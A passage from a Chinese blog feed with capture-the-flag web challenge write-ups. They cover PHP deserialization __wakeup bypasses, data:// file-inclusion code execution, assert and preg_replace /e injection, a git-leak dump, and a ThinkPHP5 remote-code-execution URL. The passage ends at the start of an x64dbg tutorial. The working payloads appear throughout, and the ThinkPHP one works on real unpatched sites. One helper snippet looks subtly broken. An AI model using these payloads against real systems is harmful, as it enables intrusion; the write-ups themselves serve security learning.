class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><h5 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP反序列化编写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//反序列化数组，a是数组的意思</span><br>a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;4444&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;<br><span class="hljs-comment">//反序列化对象，O是对象的意思</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fall&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>__wakeup函数的bypass：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</strong></p></li></ul><h5 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h5><p>很显然只是显示了部分代码，只有给出的code可以操作，那么传一个code参数上去</p><p><code>code=111</code>,回显<code>you should not type an integer</code>，告诉我们不传整型，且说明code变量是可用的。</p><p>这是一个反序列化的问题。</p><p>反序列化构造：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>，这样行不通，会调用wakeup函数</p><p>利用PHP漏洞：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，</p><p>传入：<code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>回显：<code>the answer is : cyberpeace&#123;475ed74daf373a5a3a3fe01821af26e4&#125;</code></p><h4 id="12-Web-php-include-CTF"><a href="#12-Web-php-include-CTF" class="headerlink" title="12_Web_php_include_CTF"></a>12_Web_php_include_CTF</h4><h5 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP函数——<strong>strstr</strong>：搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p></li><li><p>PHP函数——<strong>str_replace</strong>：以其他字符替换字符串中的一些字符</p></li><li><h5 id="PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On"><a href="#PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On" class="headerlink" title="&#x3D;&#x3D;PHP伪协议：data:&#x2F;&#x2F;&#x3D;&#x3D;:类似php:&#x2F;&#x2F;input，可以让用户来控制输入流，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen&#x3D;On，allow_url_include&#x3D;On"></a>&#x3D;&#x3D;<strong>PHP伪协议：data:&#x2F;&#x2F;</strong>&#x3D;&#x3D;:类似php:&#x2F;&#x2F;input，可以让用户来控制输入流，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen&#x3D;On，allow_url_include&#x3D;On</h5></li><li><p>var_dump用于显示字符串</p></li></ul><h5 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h5><p>题目的意思很明显，我们要传一个GET类型的page参数上去，然后其会替换page里面的php:&#x2F;&#x2F;为空，防止我们显示文件内容。那么我们使用data:&#x2F;&#x2F;就好了。</p><p>首先构造payload:<code>?page=data://text/plain,&lt;?php exec(&#39;ls&#39;,$result);var_dump($result);?&gt;</code></p><p>获得如下回显：</p><p><code>array(3) &#123; [0]=&gt; string(18) &quot;fl4gisisish3r3.php&quot; [1]=&gt; string(9) &quot;index.php&quot; [2]=&gt; string(11) &quot;phpinfo.php&quot; &#125;</code></p><p><code>data://text/plain,&lt;?php echo $page?&gt;</code></p><p>很显然，我们的flag应该在<code>fl4gisisish3r3.php</code>文件里，那么我们cat一下文件里的内容就行了。</p><p>再构造payload：<code>?page=data://text/plain,&lt;?php exec(&#39;cat fl4gisisish3r3.php&#39;,$result);var_dump($result);?&gt;</code></p><p>获得如下回显：<code>array(3) &#123; [0]=&gt; string(5) &quot; string(50) &quot;$flag=&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;;&quot; [2]=&gt; string(2) &quot;?&gt;&quot; &#125;</code>，找到flag.</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/Web_php_include_CTF_1.jpg"></p><p>ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p><h4 id="13-Web-php-unserialize（题解未写完）"><a href="#13-Web-php-unserialize（题解未写完）" class="headerlink" title="13_Web_php_unserialize（题解未写完）"></a>13_Web_php_unserialize（题解未写完）</h4><h5 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h5><p>进去一段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h5><ul><li>wakeup函数的绕过方法</li><li>O:+6绕过对O的正则匹配</li><li><strong>字符逃逸问题</strong></li></ul><h5 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h5><p>反序列化题，注意到<code>__destruct里有一个highlight_file</code>，这里就是出flag的地方。</p><p>显然，题目已经告诉我们secret在fl4g.php里，我们不妨先想办法去看看再说，</p><p>上传一个GET参数var，首先会被base64解码，然后会被正则过滤关键字，这里需要绕过，然后就被反序列化了，开始调用一个<code>wakeup</code>函数，会判断file参数是否是index，不是则置为index，这里也需要绕过，总共两个绕过点。</p><p>wakeup函数很好绕过，关键是正则匹配，<code>/[oc]:\d+:/</code>，这里的意思是匹配<code>o:数字:</code>，所以我们序列化中的<code>o:4</code>，就需要改一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;1:&#x27;</span>,<span class="hljs-string">&#x27;2:&#x27;</span>,<span class="hljs-variable">$s</span>);<br><span class="hljs-keyword">echo</span> base64-<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-comment">//O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></code></pre></td></tr></table></figure><p>payload就为<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><h4 id="14-MFW（git泄露）"><a href="#14-MFW（git泄露）" class="headerlink" title="14_MFW（git泄露）"></a>14_MFW（git泄露）</h4><h5 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h5><p>进去是一个个人网站的样子。跳转到About页面时，出现：</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_1.jpg"></p><p>使用了Git，说明开发者使用Git进行版本控制，很可能会存在Git引起的文件泄露问题。</p><h5 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>Git引起的文件泄露</p></li><li><p>PHP函数：str_pos:</p></li><li><p><strong>PHP函数：assert:</strong></p><ul><li><p>书写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//PHP5,7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> = ?): <span class="hljs-keyword">bool</span><br><span class="hljs-comment">//PHP7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> = ?): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure></li><li><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert() 当做 PHP 代码来执行</strong>。如果传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的assert_options处理函数时，条件会转换为字符串，而布尔值 <strong><code>false</code></strong> 会被转换成空字符串</p></li></ul></li><li></li></ul><h5 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h5><p>可能是Git泄露，尝试在浏览器访问：<code>/.git/</code>，结果出现了回显，说明猜测正确。我们使用git hack获取服务器上用git管理的文件</p><p>首先在命令行中进入githack目录下，使用<code>python GitHack.py http://61.147.171.105:56499/.git/</code>，之后会在git hack目录下生成获取到的文件的文件夹。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_2.jpg">  </p><p>获得的index.php代码如下：省略html部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现了<code>assert</code>函数，可以通过其来执行PHP代码，这里就是解题的关键。</p><p>构造payload：<code>fff&#39;)</code>用于闭合assert函数</p><p><code>fff&#39;) or exec(&quot;ls&quot;,$result);var_dump($result);//</code>          不行</p><p><code>fff&#39;) or include(&quot;data://text/plain,&lt;?php exec(&quot;ls&quot;,$result);var_dump($result);?&gt;&quot;);</code>      不行</p><p><code>fff&#39;) or system(&quot;cat templates/flag.php&quot;)//</code>      可行</p><h4 id="15-ics-05"><a href="#15-ics-05" class="headerlink" title="15_ics_05"></a>15_ics_05</h4><h5 id="描述-13"><a href="#描述-13" class="headerlink" title="描述"></a>描述</h5><p>是一个实际场景，只有设备维护中心的page能被点开</p><h5 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>文件包含</p></li><li><p><strong>ctype_alnum() 函数检测字符串是否全部为字母和(或)数字字符，如果文本中的每个字符都是字母或数字，则返回TRUE，否则返回FALSE。</strong></p></li><li><p><strong>&#x3D;&#x3D;正则表达式的修饰符：&#x3D;&#x3D;</strong></p><p><strong>i：</strong>ignore-不区分大小写<strong>g：</strong>global-全局匹配<strong>m：</strong>multi line-多行匹配</p></li><li><p>preg_replace函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数。</li><li>&#x3D;&#x3D;<strong>&#x2F;e参数：可以传入 &#x2F;e 的修饰符，然后让代码执行</strong>&#x3D;&#x3D;</li></ul></li></ul><h5 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h5><p>首先检查网页源码，只有html没有php，没用，所以我们第一个任务是找到php源码，首先访问一下index.phps，返回400，没用，看一下有没有git泄露，访问<code>/.git/</code>也没有，那就继续看看页面有没有什么可以交互的地方，发现点击标题的时候，页面发生了变化。url多了一个<code>/?page=index.php</code>，页面也出现了index，<strong>那么后端有一个page点可以交互，目前能想到的有两种，sql注入和文件包含漏洞</strong>，能排除sql注入，因为修改payload为<code>page=hhh</code>时，页面直接回显hhh，说明是没有走数据库的。那么就文件包含了，payload如下：</p><p>**<code>page=php://filter/read=convert.base64-enocode/resource=index.php</code>**，然后直接就扒出index.php经过base64-encode编码后的源码，很顺利，居然没有过滤需要绕过，然后我们解码就可以得到源码了。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/ics05_1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">posix_setuid</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$page</span>)) &#123;&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$page</span>; <span class="hljs-keyword">die</span>();<span class="hljs-meta">?&gt;</span>&lt;/p&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">else</span>&#123;&#125;<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;input&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>    <span class="hljs-keyword">die</span>();<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其实看完源码可以发现，首先是有字符串的过滤检测的，但是刚好没有php的伪协议，所以很顺利地得到了源码。解题的关键应该是有注释后的那部分代码。</p><p>有一个X-Forward-For的检测，用插件绕过就行或者用BP自己写一下，然后有三个参数：<code>pat,rep,sub</code>，被<code>preg_replace</code>函数调用，可以使用&#x2F;e参数一段PHP代码，</p><p>payload:<code>?pat=/a/e&amp;rep=system(&quot;cat index.php&quot;);&amp;sub=a</code>，</p><p>有index.php的回显，说明可行，</p><p>那么继续构造payload：<code>?pat=/a/e&amp;rep=system(&quot;ls&quot;);&amp;sub=a</code>，</p><p>有回显<code>css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</code>，东西大概率在<code>s3chahahahaDir</code>里，进去看看，果然有flag，也是个目录，里面有flag.php。</p><p>构造payload：<code>?pat=/a/e&amp;rep=system(&quot;cat s3chahahaDir/flag/flag.php&quot;);&amp;sub=a</code></p><p>在源码里出现了flag：cyberpeace{38067f93cbfb9366ec43674ebac38457}</p><h4 id="16-PHP-RCE"><a href="#16-PHP-RCE" class="headerlink" title="16_PHP_RCE"></a>16_PHP_RCE</h4><h5 id="描述-14"><a href="#描述-14" class="headerlink" title="描述"></a>描述</h5><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/php_rce_1.jpg"></p><h5 id="知识点-15"><a href="#知识点-15" class="headerlink" title="知识点"></a>知识点</h5><ul><li>ThinkPHP 漏洞之一：ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。</li><li>shell：<code>find / -name flag</code></li></ul><h5 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h5><p>第一次遇见ThinkPHP，去Github查阅一下POC，得到如下payload：</p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p><p>得到如下回显：</p><p><code>favicon.ico index.php robots.txt router.php static static</code>，不太像有flag的样子，不过检验一下漏洞是否可以利用。</p><p>接着构造<code>ls /</code>，发现根目录下有flag，cat出来，解决。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x64dbg基础使用指南</title>
    <link href="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h2 id="x64dbg的基本使用指南"><a href="#x64dbg的基本使用指南" class="headerlink" title="x64dbg的基本使用指南"></a>x64dbg的基本使用指南</h2><p>本篇是为了配合读书笔记，因为原书使用的都是32位的程序，但是目前都是x86-64的机器，所以就学习一下x64dbg。</p><p>在52的帖子里看到的一句话，现在还理解不透彻：<strong>破解的关键在于找到关键CALL</strong></p><span id="more"></span><p>本文参考文章：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1393075">1</a>，<a href="https://www.cnblogs.com/meowv/p/11428772.html">2</a></p><p>X64dbg更新很快，但作者对于帮助文档却惜墨如金，有很多实用的强大功能，都需要自己去摸索。<br>刚才提到寻找关键CALL，IDA虽然F5生成伪码功能强大，并且可以生成函数调用图，但对于复杂的调用看起来就很不直观。并且IDA只能单个文件静态分析，对于跨模块调用就无能为力。</p><h3 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h3><h4 id="什么是符号文件-pdb"><a href="#什么是符号文件-pdb" class="headerlink" title="什么是符号文件.pdb"></a>什么是符号文件.pdb</h4><p>​符号文件（Symbol Files）是一个数据信息文件。 它包含了应用程序二进制文件（比如：EXE、DLL等）调试信息，专门用来作调试之用，最终生成的可执行文件在运行时并不需要这个符号文件，但<strong>你的程序中所有的变量信息都记录在这个文件中。 所以调试应用程序时，这个文件是非常重要的</strong>。</p><h4 id="设置符号文件保存路径"><a href="#设置符号文件保存路径" class="headerlink" title="设置符号文件保存路径"></a>设置符号文件保存路径</h4><p>​符号文件通常很大，所以x64dbg自身不带有符号文件，需要自己手动下载和保存，但是默认设置相对路径不太方便，如果下载过符号文件，就会在同一文件夹下生成symbols文件夹，这样在x64dbg升级或者更换的时候非常不方便，所以自己新建一个专门的比较好</p><p><img 